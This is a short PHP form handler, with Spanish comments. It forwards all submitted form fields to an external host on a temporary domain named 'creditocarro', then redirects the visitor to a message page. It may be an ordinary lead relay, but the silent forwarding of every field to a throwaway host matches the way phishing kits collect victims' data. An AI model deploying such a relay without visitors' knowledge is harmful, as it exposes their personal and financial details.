<?php
$url = 'http://creditocarro.pxtn82hres-zng4pm5q74dp.p.temp-site.link';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
$response = curl_exec($ch);
curl_close($ch);

// Puedes realizar alguna verificación en la respuesta si es necesario
 if ($response) {
//     // Lógica de verificación aquí
 }

header('Location: ../message.html');
exit;